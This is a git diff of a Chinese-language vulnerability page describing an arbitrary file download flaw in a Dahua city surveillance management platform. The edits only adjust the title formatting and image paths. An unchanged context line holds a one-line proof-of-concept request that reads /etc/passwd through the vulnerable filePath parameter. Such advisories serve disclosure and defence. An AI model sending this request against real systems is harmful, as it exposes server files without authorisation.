@@ -1,4 +1,4 @@
-# 大华 城市安防监控系统平台管理 attachment_downloadByUrlAtt.action 任意文件下载漏洞
+# 大华 城市安防监控系统平台管理 attachment\_downloadByUrlAtt.action 任意文件下载漏洞
 
 ## 漏洞描述
 
@@ -18,7 +18,7 @@
 
 登录页面
 
-![image-20230704113653161](images/image-20230704113653161.png)
+![image-20230704113653161](../.gitbook/assets/image-20230704113653161.png)
 
 验证POC
 
@@ -26,4 +26,4 @@
 /portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
 ```
 
-![image-20230704113705975](images/image-20230704113705975.png)
+![image-20230704113705975](../.gitbook/assets/image-20230704113705975.png)
